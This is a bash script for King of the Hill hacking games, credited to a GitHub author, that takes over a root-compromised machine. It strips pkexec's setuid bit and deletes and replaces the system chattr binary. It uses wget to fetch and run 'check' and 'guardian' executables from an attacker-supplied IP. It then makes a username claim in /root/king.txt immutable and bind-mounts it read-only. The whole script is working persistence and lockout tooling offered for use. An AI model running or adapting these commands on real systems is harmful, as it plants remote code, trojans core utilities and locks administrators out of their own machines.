#!/bin/bash

# Created by @HaruKey :)

# https://github.com/H4ruKey/KOTH

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

if [[ $(id -u) -ne 0 ]]; then
    echo -e "${RED}Insufficient privileges. Please run this script as the root user or with sudo.${RESET}" >&2
    exit 1
else
    echo -e "${GREEN}You have root privileges. Continuing with the script...${RESET}"
fi
echo -e "${GREEN}-----------------------------Created by HaruKey :)-----------------------------${RESET}"

IP="$1"
username="$2"
sudo chmod -s /usr/bin/pkexec
rm -rf /usr/bin/chattr
cd /usr/bin && wget http://$IP/realchattr && mv realchattr chattr && chmod +x chattr
set write off
sudo chattr -ai /root/king.txt 2>/dev/null
echo "$username" > /root/king.txt 2>/dev/null
sudo chmod 400 /root/king.txt 2>/dev/null
sudo chattr +ai /root/king.txt 2>/dev/null
sudo mount --bind -o ro /root/king.txt /root/king.txt 2>/dev/null

cd /usr/bin && wget http://$IP/check && chmod +x check && ./check "$username" &
cd /usr/bin && wget http://$IP/guardian && chmod +x guardian && ./guardian "$IP" &

chattr +ai /usr/bin/check
chattr +ai /usr/bin/guardian

cd /usr/bin && mv chattr put
cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
cd /usr/bin && put +ai chattr

echo -e "${GREEN}Operation Fully Complete. The KING is $username! :)${RESET}"
echo
echo -e "${BLUE}-------------- Hi $username, don't forget to give me a star on GitHub --------------${RESET}"
echo -e "${BLUE}--------------------------------------------------------------------------------${RESET}"
